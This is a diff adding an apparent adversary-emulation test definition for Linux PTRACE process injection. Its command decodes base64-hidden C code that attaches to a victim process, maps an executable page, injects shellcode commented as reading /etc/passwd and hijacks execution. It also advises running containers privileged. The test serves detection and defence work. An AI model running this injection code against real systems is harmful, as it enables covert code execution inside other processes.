@@ -1,0 +1,32 @@
+attack_technique: Test
+display_name: PTRACE process injection
+atomic_tests:
+- name: Test
+  description: Performs process injection using PTRACE
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    binary:
+      description: Path to the binary to use as a victim process
+      type: Path
+      default: $(which id)
+  dependency_executor_name: sh
+  dependencies:
+  - description: Verify container is privileged.
+    prereq_command: |
+      capsh --print | grep cap_sys_admin
+    get_prereq_command: |
+      if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: add --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
+
+  executor:
+    command: |
+      echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4KI2luY2x1ZGUgPHN5cy93YWl0Lmg+CiNpbmNsdWRlIDxzeXMvdXNlci5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzeXMvbW1hbi5oPgoKLy8gY2F0IC9ldGMvcGFzc3dkIHNoZWxsY29kZQpjaGFyIHNoZWxsY29kZVtdID0gewogICAgMHg2OCwgMHg3MiwgMHg3NiwgMHg2NSwgMHgxLCAweDgxLCAweDM0LCAweDI0LCAweDEsIDB4MSwgMHgxLCAweDEsIDB4NDgsIDB4YjgsIDB4MmYsIDB4NjUsIDB4NzQsIDB4NjMsIDB4MmYsIDB4NzAsIDB4NjEsIDB4NzMsIDB4NTAsIDB4NmEsIDB4MiwgMHg1OCwgMHg0OCwgMHg4OSwgMHhlNywgMHgzMSwgMHhmNiwgMHg5OSwgMHhmLCAweDUsIDB4NDEsIDB4YmEsIDB4ZmYsIDB4ZmYsIDB4ZmYsIDB4N2YsIDB4NDgsIDB4ODksIDB4YzYsIDB4NmEsIDB4MjgsIDB4NTgsIDB4NmEsIDB4MSwgMHg1ZiwgMHg5OSwgMHhmLCAweDUKfTsKCmludCBtYWluKGludDMyX3QgYXJnYywgY2hhciAqKmFyZ3YpCnsKICAgIHBpZF90IHBpZDsKICAgIHN0cnVjdCB1c2VyX3JlZ3Nfc3RydWN0IHJlZ3M7CiAgICB1aW50NjRfdCBpbnM7CiAgICB1aW50NjRfdCBzeXNjYWxsID0gMHhjY2NjMDUwZjsKICAgIGNoYXIgKnJ3eF9wYWdlOwogICAgdWludDMyX3QgaTsKCiAgICBpZiAoYXJnYyAhPSAyKSBleGl0KDEpOwoKICAgIHBpZCA9IGF0b2koYXJndlsxXSk7CgogICAgaWYgKHB0cmFjZShQVFJBQ0VfQVRUQUNILCBwaWQsIE5VTEwsIE5VTEwpIDwgMCkKICAgIHsKICAgICAgICBwZXJyb3IoInB0cmFjZSIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgd2FpdChOVUxMKTsKCiAgICBwdHJhY2UoUFRSQUNFX0dFVFJFR1MsIHBpZCwgTlVMTCwgJnJlZ3MpOwogICAgcHRyYWNlKFBUUkFDRV9QT0tFVEVYVCwgcGlkLCByZWdzLnJpcCwgc3lzY2FsbCk7CgogICAgcmVncy5yYXggPSA5OyAvLyBtbWFwCiAgICByZWdzLnJkaSA9IE5VTEw7CiAgICByZWdzLnJzaSA9IDQwOTY7CiAgICByZWdzLnJkeCA9IFBST1RfUkVBRCB8IFBST1RfV1JJVEUgfCBQUk9UX0VYRUM7CiAgICByZWdzLnIxMCA9IE1BUF9QUklWQVRFIHwgTUFQX0FOT05ZTU9VUzsKICAgIHJlZ3MucjggPSAwOwogICAgcmVncy5yOSA9IDA7CiAgICBwdHJhY2UoUFRSQUNFX1NFVFJFR1MsIHBpZCwgTlVMTCwgJnJlZ3MpOwoKICAgIHB0cmFjZShQVFJBQ0VfQ09OVCwgcGlkLCBOVUxMLCBOVUxMKTsKICAgIHdhaXQoTlVMTCk7CgogICAgcHRyYWNlKFBUUkFDRV9HRVRSRUdTLCBwaWQsIE5VTEwsICZyZWdzKTsKCiAgICByd3hfcGFnZSA9IHJlZ3MucmF4OwogICAgaWYgKHJ3eF9wYWdlIDw9IE5VTEwpCiAgICB7CiAgICAgICAgcHJpbnRmKCJTb21ldGhpbmcgd2VudCB3cm9uZyFcbiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgZm9yIChpID0gMDsgaSA8IHNpemVvZihzaGVsbGNvZGUpOyBpKyspCiAgICB7CiAgICAgICAgcHRyYWNlKFBUUkFDRV9QT0tFVEVYVCwgcGlkLCByd3hfcGFnZSArIGksIHNoZWxsY29kZVtpXSk7CiAgICB9CgogICAgcmVncy5yaXAgPSByd3hfcGFnZTsKICAgIHB0cmFjZShQVFJBQ0VfU0VUUkVHUywgcGlkLCBOVUxMLCAmcmVncyk7CgogICAgcHRyYWNlKFBUUkFDRV9DT05ULCBwaWQsIE5VTEwsIE5VTEwpOwogICAgcHRyYWNlKFBUUkFDRV9ERVRBQ0gsIHBpZCwgTlVMTCwgTlVMTCk7CgogICAgcmV0dXJuIDA7Cn0K | base64 -d > /tmp/hijack.c
+      gcc /tmp/hijack.c -o /tmp/hijack -w
+      #{binary} & PID=$!
+      /tmp/hijack "$PID"
+      kill "$PID" 2>/dev/null
+    cleanup_command:
+      rm /tmp/hijack*
+    name: bash
+    elevation_required: true
